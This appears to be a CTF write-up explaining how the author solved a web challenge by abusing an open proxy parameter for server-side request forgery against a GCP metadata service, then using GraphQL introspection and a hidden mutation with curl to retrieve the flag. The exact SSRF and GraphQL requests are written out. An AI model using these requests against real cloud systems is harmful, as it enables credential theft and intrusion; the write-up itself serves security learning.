# DoD-Cyber-Sentinel-CTF---Web-Hard

The following challenge was part of the 2025 DoD Cyber Sentinel CTF, in which I placed 9th! This challenge was by far one of the most fun CTF challenges I have done, and combines multiple web exploits and topics along the adventure for the flag.

<ins>**The Great Juche Jaguar GraphQL Heist (Web Exploitation Hard)**</ins>

**Challenge:**

"Operative, Juche Jaguar’s intranet exposes a proxy at /proxy?url=

Abuse it to reach the internal metadata service and pull down the one‐time secret header. Armed with that header, you must then POST to the guarded GraphQL endpoint at /graphql.

The flag lives behind a mutation whose name is randomized on each startup—introspect the schema to discover it and invoke it to exfiltrate the flag. No README, no docs—discover everything yourself."

---

**Process:**



The challenge text itself reveals some key information about the web application and the initial attack vector. First, we are given that /proxy?url= is exposed on the web server, allowing us to craft a request to reach the internal metadata service as suggested by the challenge.

By looking at the IP address, I knew that this web app was likely a GCP-hosted service as it has a 34.x.x.x address. By doing some research, I discovered that the internal metadata services for these servers are hosted at the hostname metadata.google.internal (169.254.169.254)

Using our exposed /proxy?url= parameter, I attempted to create the following request in Burp Suite (curl could also be used):

```GET /proxy?url=http://metadata.google.internal/computeMetadata/v1/instance/attributes/```

Unfortunately, this request resulted in an invalid URL response. However, it is worth a shot to try the request again with the resolved hostname:

```GET /proxy?url=http://169.254.169.254/computeMetadata/v1/instance/attributes/```

Thankfully, this worked and revealed two attribute names for me, “X-JJ-SECRET” and “ssh-keys”

---

Given that the challenge asks us to find the one-time secret header, we can conclude that “X-JJ-SECRET” is our target. With one more GET request, we can grab the attribute:

```GET /proxy?url=http://169.254.169.254/computeMetadata/v1/instance/attributes/X-JJ-SECRET```

Which returns the value “S3NT1N3L”

---

Now that I had the one-time secret header, it was time to make a POST request to the guarded GraphQL endpoint at /graphql. The challenge states that the flag lives behind a mutation whose name is randomized on each startup, and thus, we need to consult the schema. I achieved this using a simple POST request with curl:

```
curl -X POST "http://34.86.186.68:8080/graphql" \
  -H "X-JJ-SECRET: S3NT1N3L" \
  -H "Content-Type: application/json" \
  -d '{"query":"{ __schema { mutationType { fields { name } } } }"}'
```

Which returned: eyJkYXRhIjp7Il9fc2NoZW1hIjp7Im11dGF0aW9uVHlwZSI6eyJmaWVsZHMiOlt7Im5hbWUiOiJtMzA5ZTUzMzYifV19fX19   

A quick base64 decode reveals the name of the target mutation "m309e5336"
![image](https://github.com/user-attachments/assets/dba3e1e3-9600-4324-acbf-155bdc03bf79)

---

Now that I had the name for the mutation, one more request is required:

```
curl -X POST "http://34.86.186.68:8080/graphql" \
  -H "X-JJ-SECRET: S3NT1N3L" \
  -H "Content-Type: application/json" \
  -d '{"query":"mutation { m309e5336 }"}'         
```

Which returned:
eyJkYXRhIjp7Im0zMDllNTMzNiI6IkMxe3NzdDFfcjNtMHQzX2MwZDNfeDNjfSJ9fQ==

Using base64, we can obtain our flag:
![image](https://github.com/user-attachments/assets/50d571b6-700b-49d9-a3dd-a07c5973d69e)

